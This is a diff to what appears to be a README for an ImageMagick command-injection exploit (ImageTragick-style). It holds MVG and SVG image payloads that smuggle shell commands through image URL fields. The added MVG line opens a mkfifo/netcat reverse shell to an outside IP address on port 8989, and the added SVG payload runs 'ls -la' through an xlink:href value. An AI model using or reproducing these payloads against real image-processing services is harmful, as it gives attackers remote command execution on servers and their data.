@@ -25,8 +25,20 @@ pop grahic-context
 ```
 push graphic-context
 viewbox 0 0 640 480
-image over 0,0 0,0 'https://127.0.0.1/x.php?x=` rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc x.x.x.x 8989 >/tmp/f `'
+fill 'url(https://example.com/image.jpg"|rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 121.42.56.8 8989 >/tmp/f")'
 pop graphic-context
+```
+### svg
+```
+<?xml version="1.0" standalone="no"?>
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
+"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg width="640px" height="480px" version="1.1"
+xmlns="http://www.w3.org/2000/svg" xmlns:xlink=
+"http://www.w3.org/1999/xlink">
+<image xlink:href="https://example.com/image.jpg&quot;|ls &quot;-la"
+x="0" y="0" height="640px" width="480px"/>
+</svg>
 ```
 
 ## How To Use
